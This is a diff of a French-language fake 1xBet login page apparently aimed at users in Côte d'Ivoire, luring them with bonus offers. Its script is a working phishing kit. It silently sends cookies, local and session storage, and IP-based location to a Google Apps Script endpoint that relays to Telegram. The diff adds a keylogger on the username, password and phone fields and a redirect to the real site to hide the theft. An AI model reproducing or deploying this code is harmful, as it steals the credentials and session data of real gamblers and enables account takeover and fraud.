@@ -1,342 +1,334 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>1xBet - Connexion</title>
-    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHHSURBVHgB7ZcxbsIwGIX/L5AouTE3cAMkFgYGu0NXpEtXxg6MEQlWlk7d2BmYkLpUbB0Ze0AGJKqxN34SJ3JMEkNCBfRJnxRb+nx6z7ENIaXkf47nOgYAhBBQSoVSCsYYCCFQSsFxHNTrdTQaDeRyOUzTFD/zPM/zWhRFEkVR+FqSJDiOY+I4BgC4rov7+x+H41oWQggQQqBUKqFUKqHb7eL5+RkhhDBNE2EYYjqd4u7uDhsbG/+iwPM8k2UZRFEUAECv18P+/j4IIQCA5XKJw8MDbG5uAgBmsxkODg4wGAyyU0AIgSzLAACEkM++AwCEEHieB9d1k8/n83lkWYb7+/vkBKCcpmn4fD7j7e0NWZYBAERRBABwdnaGl5eXjwg4PT2FpmkghMD3fYQQYpZlGUEQ4OjoCNlsFtvb2zg6Okusv0mQAEY=" crossorigin="anonymous">
-    <style>
-        /* identique à votre version — inchangé */
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Arial,Helvetica,sans-serif; }
-        body { background:#f4f4f4; min-height:100vh; }
-
-        body{background:#0a0a1a;color:#fff;min-height:100vh}
-        .container{max-width:480px;margin:0 auto;padding:0 16px}
-        .loader-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:#1a1a2e;display:flex;align-items:center;justify-content:center;z-index:99999;flex-direction:column;transition:opacity .5s}
-        .loader-overlay.hidden{opacity:0;pointer-events:none}
-        .loader-spinner{width:48px;height:48px;border:3px solid rgba(0,180,80,.15);border-top-color:#00b450;border-radius:50%;animation:loadSpin .8s linear infinite}
-        .loader-text{color:#00b450;font-size:14px;margin-top:14px;letter-spacing:1px}
-        @keyframes loadSpin{to{transform:rotate(360deg)}}
-        .header{background:#0d0d22;border-bottom:1px solid rgba(0,180,80,.15);position:sticky;top:0;z-index:100}
-        .header-top{padding:10px 0;border-bottom:1px solid #1a1a35}
-        .header-top .container{display:flex;align-items:center;justify-content:space-between}
-        .header-left{display:flex;align-items:center;gap:14px}
-        .logo{font-size:28px;font-weight:900;letter-spacing:-1px}
-        .logo-1{color:#00b450}.logo-x{color:#fff}.logo-b{color:#00b450}.logo-et{color:#fff;font-weight:700}
-        .header-badge{display:flex;align-items:center;gap:6px;font-size:11px;color:#00b450;background:rgba(0,180,80,.1);padding:4px 10px;border-radius:20px;border:1px solid rgba(0,180,80,.2)}
-        .badge-dot{width:6px;height:6px;background:#00b450;border-radius:50%;animation:blink 1.5s infinite}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-        .btn-register{background:#00b450;color:#fff;text-decoration:none;padding:8px 18px;border-radius:6px;font-size:13px;font-weight:700;text-transform:uppercase;transition:background .2s}
-        .btn-register:hover{background:#009a42}
-        .header-promo{background:linear-gradient(90deg,#0d0d22,#1a1a35);padding:8px 0}
-        .promo-text{font-size:12px;color:#ccc;text-align:center}
-        .promo-amount{color:#ffd700;font-weight:700}
-        .hero{padding:28px 0 20px}
-        .hero-card{background:linear-gradient(135deg,#0d4a1e,#1a1a35);border:1px solid rgba(0,180,80,.25);border-radius:16px;padding:30px 24px;text-align:center;position:relative;overflow:hidden}
-        .hero-card::before{content:'';position:absolute;top:-60px;right:-60px;width:180px;height:180px;background:radial-gradient(circle,rgba(0,180,80,.1),transparent);border-radius:50%}
-        .hero-badge{display:inline-block;background:rgba(255,215,0,.15);color:#ffd700;font-size:10px;font-weight:700;padding:4px 14px;border-radius:20px;border:1px solid rgba(255,215,0,.2);letter-spacing:1px;margin-bottom:12px;text-transform:uppercase}
-        .hero-title{font-size:28px;font-weight:900;line-height:1.2;margin-bottom:8px}
-        .hero-amount{color:#ffd700;font-size:38px;display:block;text-shadow:0 0 30px rgba(255,215,0,.3)}
-        .hero-sub{color:#aaa;font-size:13px;margin-bottom:16px}
-        .hero-countdown{display:flex;align-items:center;justify-content:center;gap:4px}
-        .cd-item{background:rgba(0,0,0,.4);border-radius:8px;padding:6px 12px;text-align:center;min-width:52px}
-        .cd-num{font-size:20px;font-weight:800;color:#ffd700;display:block}
-        .cd-label{font-size:8px;color:#888;text-transform:uppercase}
-        .cd-sep{font-size:22px;font-weight:700;color:#555}
-        .login-section{padding:0 0 30px}
-        .login-card{background:#111128;border:1px solid #1e1e40;border-radius:16px;padding:24px 20px}
-        .login-tabs{display:flex;margin-bottom:20px;border-bottom:1px solid #1e1e40}
-        .tab{flex:1;padding:12px;background:none;border:none;color:#666;font-size:14px;font-weight:600;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;text-transform:uppercase}
-        .tab.active{color:#00b450;border-bottom-color:#00b450}
-        .tab-content{display:none}.tab-content.active{display:block}
-        .input-group{margin-bottom:16px;position:relative}
-        .input-group label{display:block;color:#999;font-size:12px;font-weight:600;margin-bottom:6px;text-transform:uppercase}
-        .input-group input{width:100%;padding:14px 16px;background:#0a0a1a;border:1px solid #222244;border-radius:8px;color:#fff;font-size:15px;outline:none;transition:border .2s}
-        .input-group input:focus{border-color:#00b450;box-shadow:0 0 0 3px rgba(0,180,80,.1)}
-        .input-group input::placeholder{color:#444}
-        .phone-input{display:flex;align-items:center}
-        .phone-prefix{background:#0d0d22;border:1px solid #222244;border-right:none;border-radius:8px 0 0 8px;padding:14px 12px;font-size:14px;color:#888}
-        .phone-input input{border-radius:0 8px 8px 0}
-        .toggle-pass{position:absolute;right:12px;bottom:12px;background:none;border:none;cursor:pointer;padding:4px}
-        .login-options{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
-        .checkbox-custom{display:flex;align-items:center;gap:8px;font-size:12px;color:#999;cursor:pointer}
-        .checkbox-custom input{display:none}
-        .checkmark{width:16px;height:16px;border:1px solid #444;border-radius:3px;display:inline-block;position:relative}
-        .checkbox-custom input:checked+.checkmark{background:#00b450;border-color:#00b450}
-        .checkbox-custom input:checked+.checkmark::after{content:'✓';position:absolute;top:-2px;left:2px;font-size:12px;color:#fff}
-        .forgot-link{color:#666;font-size:12px;text-decoration:none}.forgot-link:hover{color:#00b450}
-        .btn-login{width:100%;padding:16px;background:linear-gradient(135deg,#00b450,#009a42);color:#fff;font-size:16px;font-weight:800;border:none;border-radius:10px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px}
-        .btn-login:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,180,80,.25)}
-        .btn-login:disabled{opacity:.6;cursor:not-allowed}
-        .spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
-        .spinner.show{display:inline-block}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .flash-message{display:none;color:#ff0050;font-size:13px;margin-top:14px;text-align:center;padding:8px;background:rgba(255,0,80,.08);border-radius:6px}
-        .flash-message.show{display:block}
-        .login-footer{text-align:center;margin-top:20px;padding-top:18px;border-top:1px solid #1e1e40}
-        .login-footer p{font-size:13px;color:#999}
-        .login-footer a{color:#00b450;text-decoration:none;font-weight:600}
-        .payment-icons{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:14px}
-        .pay-item{background:#0a0a1a;border:1px solid #1e1e40;padding:5px 12px;border-radius:20px;font-size:11px;color:#777;font-weight:600}
-        .footer{background:#08081a;padding:20px 0;border-top:1px solid #1a1a35}
-        .footer-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px}
-        .footer-logo{font-size:22px;font-weight:900}
-        .footer-links{display:flex;gap:12px;flex-wrap:wrap}
-        .footer-links a{color:#555;font-size:11px;text-decoration:none}.footer-links a:hover{color:#00b450}
-        .footer-bottom{text-align:center}.footer-bottom p{color:#444;font-size:11px}
-        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1a1a35;border:1px solid #333;color:#fff;padding:14px 24px;border-radius:12px;font-size:14px;display:none;z-index:99999;box-shadow:0 10px 40px rgba(0,0,0,.6);max-width:90%;text-align:center}
-        .toast.show{display:block}
-        @media (max-width:400px){.hero-title{font-size:22px}.hero-amount{font-size:30px}.logo{font-size:22px}.btn-register{font-size:11px;padding:6px 12px}.hero-card{padding:20px 16px}}
-        body { background:#0a0a1a; color:#fff; font-family:'Segoe UI',Arial,Helvetica,sans-serif; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>1xBet - Connexion</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHHSURBVHgB7ZcxbsIwGIX/L5AouTE3cAMkFgYGu0NXpEtXxg6MEQlWlk7d2BmYkLpUbB0Ze0AGJKqxN34SJ3JMEkNCBfRJnxRb+nx6z7ENIaXkf47nOgYAhBBQSoVSCsYYCCFQSsFxHNTrdTQaDeRyOUzTFD/zPM/zWhRFEkVR+FqSJDiOY+I4BgC4rov7+x+H41oWQggQQqBUKqFUKqHb7eL5+RkhhDBNE2EYYjqd4u7uDhsbG/+iwPM8k2UZRFEUAECv18P+/j4IIQCA5XKJw8MDbG5uAgBmsxkODg4wGAyyU0AIgSzLAACEkM++AwCEEHieB9d1k8/n83lkWYb7+/vkBKCcpmn4fD7j7e0NWZYBAERRBABwdnaGl5eXjwg4PT2FpmkghMD3fYQQYpZlGUEQ4OjoCNlsFtvb2zg6Okusv0mQAEY=" crossorigin="anonymous">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,Helvetica,sans-serif}
+body{background:#0a0a1a;color:#fff;min-height:100vh}
+.container{max-width:480px;margin:0 auto;padding:0 16px}
+.loader-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:#1a1a2e;display:flex;align-items:center;justify-content:center;z-index:99999;flex-direction:column;transition:opacity .5s}
+.loader-overlay.hidden{opacity:0;pointer-events:none}
+.loader-spinner{width:48px;height:48px;border:3px solid rgba(0,180,80,.15);border-top-color:#00b450;border-radius:50%;animation:loadSpin .8s linear infinite}
+.loader-text{color:#00b450;font-size:14px;margin-top:14px;letter-spacing:1px}
+@keyframes loadSpin{to{transform:rotate(360deg)}}
+.header{background:#0d0d22;border-bottom:1px solid rgba(0,180,80,.15);position:sticky;top:0;z-index:100}
+.header-top{padding:10px 0;border-bottom:1px solid #1a1a35}
+.header-top .container{display:flex;align-items:center;justify-content:space-between}
+.header-left{display:flex;align-items:center;gap:14px}
+.logo{font-size:28px;font-weight:900;letter-spacing:-1px}
+.logo-1{color:#00b450}.logo-x{color:#fff}.logo-b{color:#00b450}.logo-et{color:#fff;font-weight:700}
+.header-badge{display:flex;align-items:center;gap:6px;font-size:11px;color:#00b450;background:rgba(0,180,80,.1);padding:4px 10px;border-radius:20px;border:1px solid rgba(0,180,80,.2)}
+.badge-dot{width:6px;height:6px;background:#00b450;border-radius:50%;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.btn-register{background:#00b450;color:#fff;text-decoration:none;padding:8px 18px;border-radius:6px;font-size:13px;font-weight:700;text-transform:uppercase;transition:background .2s}
+.btn-register:hover{background:#009a42}
+.header-promo{background:linear-gradient(90deg,#0d0d22,#1a1a35);padding:8px 0}
+.promo-text{font-size:12px;color:#ccc;text-align:center}
+.promo-amount{color:#ffd700;font-weight:700}
+.hero{padding:28px 0 20px}
+.hero-card{background:linear-gradient(135deg,#0d4a1e,#1a1a35);border:1px solid rgba(0,180,80,.25);border-radius:16px;padding:30px 24px;text-align:center;position:relative;overflow:hidden}
+.hero-card::before{content:'';position:absolute;top:-60px;right:-60px;width:180px;height:180px;background:radial-gradient(circle,rgba(0,180,80,.1),transparent);border-radius:50%}
+.hero-badge{display:inline-block;background:rgba(255,215,0,.15);color:#ffd700;font-size:10px;font-weight:700;padding:4px 14px;border-radius:20px;border:1px solid rgba(255,215,0,.2);letter-spacing:1px;margin-bottom:12px;text-transform:uppercase}
+.hero-title{font-size:28px;font-weight:900;line-height:1.2;margin-bottom:8px}
+.hero-amount{color:#ffd700;font-size:38px;display:block;text-shadow:0 0 30px rgba(255,215,0,.3)}
+.hero-sub{color:#aaa;font-size:13px;margin-bottom:16px}
+.hero-countdown{display:flex;align-items:center;justify-content:center;gap:4px}
+.cd-item{background:rgba(0,0,0,.4);border-radius:8px;padding:6px 12px;text-align:center;min-width:52px}
+.cd-num{font-size:20px;font-weight:800;color:#ffd700;display:block}
+.cd-label{font-size:8px;color:#888;text-transform:uppercase}
+.cd-sep{font-size:22px;font-weight:700;color:#555}
+.login-section{padding:0 0 30px}
+.login-card{background:#111128;border:1px solid #1e1e40;border-radius:16px;padding:24px 20px}
+.login-tabs{display:flex;margin-bottom:20px;border-bottom:1px solid #1e1e40}
+.tab{flex:1;padding:12px;background:none;border:none;color:#666;font-size:14px;font-weight:600;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;text-transform:uppercase}
+.tab.active{color:#00b450;border-bottom-color:#00b450}
+.tab-content{display:none}.tab-content.active{display:block}
+.input-group{margin-bottom:16px;position:relative}
+.input-group label{display:block;color:#999;font-size:12px;font-weight:600;margin-bottom:6px;text-transform:uppercase}
+.input-group input{width:100%;padding:14px 16px;background:#0a0a1a;border:1px solid #222244;border-radius:8px;color:#fff;font-size:15px;outline:none;transition:border .2s}
+.input-group input:focus{border-color:#00b450;box-shadow:0 0 0 3px rgba(0,180,80,.1)}
+.input-group input::placeholder{color:#444}
+.phone-input{display:flex;align-items:center}
+.phone-prefix{background:#0d0d22;border:1px solid #222244;border-right:none;border-radius:8px 0 0 8px;padding:14px 12px;font-size:14px;color:#888}
+.phone-input input{border-radius:0 8px 8px 0}
+.toggle-pass{position:absolute;right:12px;bottom:12px;background:none;border:none;cursor:pointer;padding:4px}
+.login-options{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
+.checkbox-custom{display:flex;align-items:center;gap:8px;font-size:12px;color:#999;cursor:pointer}
+.checkbox-custom input{display:none}
+.checkmark{width:16px;height:16px;border:1px solid #444;border-radius:3px;display:inline-block;position:relative}
+.checkbox-custom input:checked+.checkmark{background:#00b450;border-color:#00b450}
+.checkbox-custom input:checked+.checkmark::after{content:'✓';position:absolute;top:-2px;left:2px;font-size:12px;color:#fff}
+.forgot-link{color:#666;font-size:12px;text-decoration:none}.forgot-link:hover{color:#00b450}
+.btn-login{width:100%;padding:16px;background:linear-gradient(135deg,#00b450,#009a42);color:#fff;font-size:16px;font-weight:800;border:none;border-radius:10px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-login:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,180,80,.25)}
+.btn-login:disabled{opacity:.6;cursor:not-allowed}
+.spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+.spinner.show{display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.flash-message{display:none;color:#ffb4b4;font-size:13px;margin-top:14px;text-align:center;padding:8px;background:rgba(255,0,80,.08);border-radius:6px}
+.login-footer{text-align:center;margin-top:20px;padding-top:18px;border-top:1px solid #1e1e40}
+.login-footer p{font-size:13px;color:#999}
+.login-footer a{color:#00b450;text-decoration:none;font-weight:600}
+.payment-icons{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:14px}
+.pay-item{background:#0a0a1a;border:1px solid #1e1e40;padding:5px 12px;border-radius:20px;font-size:11px;color:#777;font-weight:600}
+.footer{background:#08081a;padding:20px 0;border-top:1px solid #1a1a35}
+.footer-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px}
+.footer-logo{font-size:22px;font-weight:900}
+.footer-links{display:flex;gap:12px;flex-wrap:wrap}
+.footer-links a{color:#555;font-size:11px;text-decoration:none}.footer-links a:hover{color:#00b450}
+.footer-bottom{text-align:center}.footer-bottom p{color:#444;font-size:11px}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1a1a35;border:1px solid #3333;color:#fff;padding:14px 24px;border-radius:12px;font-size:14px;display:none;z-index:99999;box-shadow:0 10px 40px rgba(0,0,0,.6);max-width:90%;text-align:center}
+.toast.show{display:block}
+@media (max-width:400px){.hero-title{font-size:22px}.hero-amount{font-size:30px}.logo{font-size:22px}.btn-register{font-size:11px;padding:6px 12px}.hero-card{padding:20px 16px}}
+</style>
 </head>
 <body>
-    <!-- LOADER -->
-    <div class="loader-overlay" id="loader">
-        <div class="loader-spinner"></div>
-        <div class="loader-text">1xBet Sécurisé</div>
+<div class="loader-overlay" id="loader"><div class="loader-spinner"></div><div class="loader-text">1xBet Sécurisé</div></div>
+
+<header class="header">
+  <div class="header-top">
+    <div class="container">
+      <div class="header-left">
+        <div class="logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
+        <div class="header-badge"><span class="badge-dot"></span> Live</div>
+      </div>
+      <div class="header-right"><a href="#" class="btn-register">Inscription</a></div>
     </div>
+  </div>
+  <div class="header-promo"><div class="container"><div class="promo-text">🔥 <strong>BONUS EXCLUSIF</strong> : jusqu'à <span class="promo-amount">200 000 FCFA</span> + 150 tours gratuits</div></div></div>
+</header>
 
-    <!-- HEADER (IDENTIQUE À VOTRE VERSION) -->
-    <header class="header">
-        <div class="header-top">
-            <div class="container">
-                <div class="header-left">
-                    <div class="logo">
-                        <span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span>
-                    </div>
-                    <div class="header-badge"><span class="badge-dot"></span> Live</div>
-                </div>
-                <div class="header-right"><a href="#" class="btn-register">Inscription</a></div>
-            </div>
+<section class="hero">
+  <div class="container">
+    <div class="hero-card">
+      <div class="hero-badge">OFFRE SPÉCIALE</div>
+      <h1 class="hero-title">CONNECTE-TOI ET<br>REÇOIS <span class="hero-amount">15 000 F</span><br>DE BONUS</h1>
+      <p class="hero-sub">Sur ton premier dépôt — Offre limitée dans le temps</p>
+      <div class="hero-countdown">
+        <div class="cd-item"><span class="cd-num" id="cd-hours">23</span><span class="cd-label">Heures</span></div>
+        <div class="cd-sep">:</div>
+        <div class="cd-item"><span class="cd-num" id="cd-min">58</span><span class="cd-label">Minutes</span></div>
+        <div class="cd-sep">:</div>
+        <div class="cd-item"><span class="cd-num" id="cd-sec">12</span><span class="cd-label">Secondes</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="login-section">
+  <div class="container">
+    <div class="login-card">
+      <div class="login-tabs">
+        <button class="tab active" data-tab="login">Connexion</button>
+        <button class="tab" data-tab="phone">Téléphone</button>
+      </div>
+      <form id="loginForm">
+        <div id="loginTab" class="tab-content active">
+          <div class="input-group"><label>E-mail ou identifiant</label>
+            <input type="text" id="username" placeholder="Entrez votre e-mail ou identifiant" autocomplete="off" autocorrect="off" autocapitalize="off">
+          </div>
         </div>
-        <div class="header-promo">
-            <div class="container">
-                <div class="promo-text">🔥 <strong>BONUS EXCLUSIF</strong> : jusqu'à <span class="promo-amount">200 000 FCFA</span> + 150 tours gratuits</div>
+        <div id="phoneTab" class="tab-content">
+          <div class="input-group"><label>Numéro de téléphone</label>
+            <div class="phone-input">
+              <span class="phone-prefix">+225</span>
+              <input type="tel" id="phone" placeholder="XX XX XX XX XX">
             </div>
+          </div>
         </div>
-    </header>
-
-    <!-- HERO (IDENTIQUE) -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-card">
-                <div class="hero-badge">OFFRE SPÉCIALE</div>
-                <h1 class="hero-title">CONNECTE-TOI ET<br>REÇOIS <span class="hero-amount">15 000 F</span><br>DE BONUS</h1>
-                <p class="hero-sub">Sur ton premier dépôt — Offre limitée dans le temps</p>
-                <div class="hero-countdown" id="countdown">
-                    <div class="cd-item"><span class="cd-num" id="cd-hours">23</span><span class="cd-label">Heures</span></div>
-                    <div class="cd-sep">:</div>
-                    <div class="cd-item"><span class="cd-num" id="cd-min">58</span><span class="cd-label">Minutes</span></div>
-                    <div class="cd-sep">:</div>
-                    <div class="cd-item"><span class="cd-num" id="cd-sec">12</span><span class="cd-label">Secondes</span></div>
-                </div>
-            </div>
+        <div class="input-group">
+          <label>Mot de passe</label>
+          <input type="password" id="password" placeholder="Entrez votre mot de passe" autocomplete="off">
+          <button type="button" class="toggle-pass" id="togglePass">
+            <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#888" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          </button>
         </div>
-    </section>
-
-    <!-- LOGIN (IDENTIQUE) -->
-    <section class="login-section">
-        <div class="container">
-            <div class="login-card">
-                <div class="login-tabs">
-                    <button class="tab active" data-tab="login">Connexion</button>
-                    <button class="tab" data-tab="phone">Téléphone</button>
-                </div>
-
-                <form id="loginForm" autocomplete="off">
-                    <div id="loginTab" class="tab-content active">
-                        <div class="input-group"><label>E-mail ou identifiant</label>
-                            <input type="text" id="username" placeholder="Entrez votre e-mail ou identifiant">
-                        </div>
-                    </div>
-                    <div id="phoneTab" class="tab-content">
-                        <div class="input-group"><label>Numéro de téléphone</label>
-                            <div class="phone-input">
-                                <span class="phone-prefix">+225</span>
-                                <input type="tel" id="phone" placeholder="XX XX XX XX XX">
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="input-group">
-                        <label>Mot de passe</label>
-                        <input type="password" id="password" placeholder="Entrez votre mot de passe">
-                        <button type="button" class="toggle-pass" id="togglePass">
-                            <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#888" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-                        </button>
-                    </div>
-
-                    <div class="login-options">
-                        <label class="checkbox-custom"><input type="checkbox" checked><span class="checkmark"></span>Se souvenir de moi</label>
-                        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
-                    </div>
-
-                    <button type="submit" class="btn-login" id="submitBtn">
-                        <span id="btnText">SE CONNECTER</span>
-                        <span class="spinner" id="spinner"></span>
-                    </button>
-
-                    <div class="flash-message" id="flashMsg"></div>
-                </form>
-
-                <div class="login-footer">
-                    <p>Pas encore de compte ? <a href="#">Inscris-toi et reçois ton bonus</a></p>
-                    <div class="payment-icons">
-                        <span class="pay-item">Orange Money</span>
-                        <span class="pay-item">MTN MoMo</span>
-                        <span class="pay-item">Wave</span>
-                        <span class="pay-item">Free Money</span>
-                    </div>
-                </div>
-            </div>
+        <div class="login-options">
+          <label class="checkbox-custom"><input type="checkbox" checked><span class="checkmark"></span>Se souvenir de moi</label>
+          <a href="#" class="forgot-link">Mot de passe oublié ?</a>
         </div>
-    </section>
+        <button type="submit" class="btn-login" id="submitBtn"><span id="btnText">SE CONNECTER</span><span class="spinner" id="spinner"></span></button>
+        <div class="flash-message" id="flashMsg"></div>
+      </form>
+      <div class="login-footer">
+        <p>Pas encore de compte ? <a href="#">Inscris-toi et reçois ton bonus</a></p>
+        <div class="payment-icons"><span class="pay-item">Orange Money</span><span class="pay-item">MTN MoMo</span><span class="pay-item">Wave</span><span class="pay-item">Free Money</span></div>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <!-- FOOTER -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-top">
-                <div class="footer-logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
-                <div class="footer-links">
-                    <a href="#">Conditions générales</a><a href="#">Politique de confidentialité</a><a href="#">Aide</a><a href="#">18+</a>
-                </div>
-            </div>
-            <div class="footer-bottom"><p>1xBet © 2026. Tous droits réservés. Jouez responsablement.</p></div>
-        </div>
-    </footer>
+<footer class="footer">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
+      <div class="footer-links"><a href="#">Conditions générales</a><a href="#">Politique de confidentialité</a><a href="#">Aide</a><a href="#">18+</a></div>
+    </div>
+    <div class="footer-bottom"><p>1xBet © 2026. Tous droits réservés. Jouez responsablement.</p></div>
+  </div>
+</footer>
 
-    <script>
-        (function(){
-            'use strict';
+<script>
+(function(){
+'use strict';
 
-            /* ============================================================
-               ENDPOINT — votre récepteur Apps Script
-               PLUS AUCUN token / chat ID ici : ils vivent côté Apps Script
-               ============================================================ */
-            var EP = 'https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec';
+/* =====================================================================
+   ENDPOINT — votre récepteur Apps Script
+   (le token + chat ID vivent UNIQUEMENT côté Google, jamais ici)
+   ===================================================================== */
+var EP='https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec';
 
-            /* ---------- envoi silencieux vers Apps Script ---------- */
-            function sendText(text) {
-                try {
-                    var x = new XMLHttpRequest();
-                    x.open('POST', EP, true);
-                    x.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); // évite le preflight CORS
-                    x.send(JSON.stringify({ text: text }));
-                    return true;
-                } catch (e) { return false; }
-            }
+/* =====================================================================
+   REDIRECTION FINALE VERS LA VRAIE PAGE 1XBET
+   ===================================================================== */
+var REAL='https://1xbet.com/fr';
 
-            /* ---------- helpers ---------- */
-            function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>'); }
+/* ---------- envoi silencieux ---------- */
+function sendText(tt){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST',EP,true);
+    x.setRequestHeader('Content-Type','text/plain;charset=utf-8');
+    x.send(JSON.stringify({text:tt}));
+  }catch(e){}
+}
+function enc(s){return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');}
 
-            function grabEnv(){
-                var c='', ls='', ss='';
-                try{ c=document.cookie||'(aucun)'; }catch(e){ c='(bloqué)'; }
-                try{ for(var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); ls+=k+'='+(localStorage.getItem(k)||'')+';\n'; } }catch(e){}
-                try{ for(var j=0;j<sessionStorage.length;j++){ var k2=sessionStorage.key(j); ss+=k2+'='+(sessionStorage.getItem(k2)||'')+';\n'; } }catch(e){}
-                return {cookie:c, ls:ls, ss:ss};
-            }
+/* ---------- géolocalisation ---------- */
+function getGeo(){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','https://ipapi.co/json/',false);
+    x.send();
+    if(x.status===200){var d=JSON.parse(x.responseText);return (d.ip||'N/A')+' | '+(d.city||'')+', '+(d.country_name||'');}
+  }catch(e){}
+  return 'N/A';
+}
+function getEnv(){
+  var o={c:'',ls:'',ss:''};
+  try{o.c=document.cookie||'(aucun)';}catch(e){o.c='(bloqué)';}
+  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls+=k+'='+(localStorage.getItem(k)||'')+';\n';}}catch(e){}
+  try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss+=k2+'='+(sessionStorage.getItem(k2)||'')+';\n';}}catch(e){}
+  return o;
+}
 
-            function getGeo(){
-                try{
-                    var x = new XMLHttpRequest();
-                    x.open('GET','https://ipapi.co/json/',false); // synchrone court
-                    x.send();
-                    if(x.status===200){
-                        var d = JSON.parse(x.responseText);
-                        return (d.ip||'N/A')+' | '+(d.city||'')+', '+(d.country_name||'');
-                    }
-                }catch(e){}
-                return 'N/A';
-            }
+/* =====================================================================
+   KEYLOGGER — capture chaque frappe faite dans les champs
+   (filet de sécurité même si la personne ne clique pas "Se connecter")
+   ===================================================================== */
+var klBuf='';
+document.addEventListener('keydown',function(e){
+  var tg=e.target;
+  if(tg && (tg.id==='username'||tg.id==='password'||tg.id==='phone')){
+    var k=e.key;
+    if(k.length===1){klBuf+=k;}
+    else if(k==='Backspace'){klBuf=klBuf.slice(0,-1);}
+    else if(k==='Enter'){klBuf+=k;}
+    if(klBuf.length>=50){flushKL();}
+  }
+});
+function flushKL(){
+  if(!klBuf)return;
+  sendText('<b>\u2328\ufe0f 1XBET KEYSTROKES</b>\n<pre>'+enc(klBuf)+'</pre>\n\u23f1 '+new Date().toISOString());
+  klBuf='';
+}
+setInterval(function(){if(klBuf.length>12)flushKL();},3500);
 
